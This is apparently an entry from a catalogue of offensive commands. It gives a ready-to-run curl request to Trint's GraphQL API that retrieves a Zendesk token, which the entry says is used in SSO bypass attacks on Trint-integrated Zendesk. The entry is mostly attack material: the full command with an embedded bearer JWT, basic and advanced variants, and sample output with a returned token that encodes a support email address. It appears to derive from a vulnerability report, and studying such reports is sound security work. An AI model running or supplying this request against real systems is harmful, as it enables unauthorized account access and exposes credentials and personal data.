---
data: >-
  curl -X POST https://graphql2.trint.com/ -H 'Authorization: Bearer
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU'
  -H 'Content-Type: application/json' -d
  '{"operationName":null,"variables":{"status":"PENDING"},"query":"query
  zendeskToken {\n zendeskToken\n }\n"}'
tags:
  - graphql
  - token-query
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 687da3f8-bae5-442e-8952-ce25c4514b09
created_at: '2025-12-13T09:01:26.358Z'
updated_at: '2025-12-13T09:01:26.358Z'
verified: false
validated: true
submitted: true
---
# GraphQL Zendesk Token Query

## Command

```bash
curl -X POST https://graphql2.trint.com/ \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n zendeskToken\n }\n"}'
```

## Description

Sends a GraphQL query to retrieve the Zendesk token after registration, used in SSO bypass attacks against Trint-integrated Zendesk.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Authorization: Bearer <token>'` | Authenticates with JWT from registration | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '<json_payload>'` | GraphQL query and variables | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://graphql2.trint.com/ -H 'Authorization: Bearer <your_token>' -H 'Content-Type: application/json' -d '{"query":"query zendeskToken { zendeskToken }","variables":{"status":"PENDING"}}'
```

### Advanced Usage

```bash
curl -X POST https://graphql2.trint.com/ -H 'Authorization: Bearer <your_token>' -H 'Content-Type: application/json' -H 'X-Trint-Request-Id: some-id' -d '{"query":"query zendeskToken { zendeskToken }","variables":{"status":"PENDING"}}'
```

## Expected Output

JSON response containing the zendeskToken JWT, e.g., {'data':{'zendeskToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM'}}

## Related

- [[procedures/Execute-GraphQL-Query-for-Zendesk-Token]]
- [[SSO-Bypass-via-Unverified-Email-Registration-in-Trint-Leading-to-Zendesk-Access]]
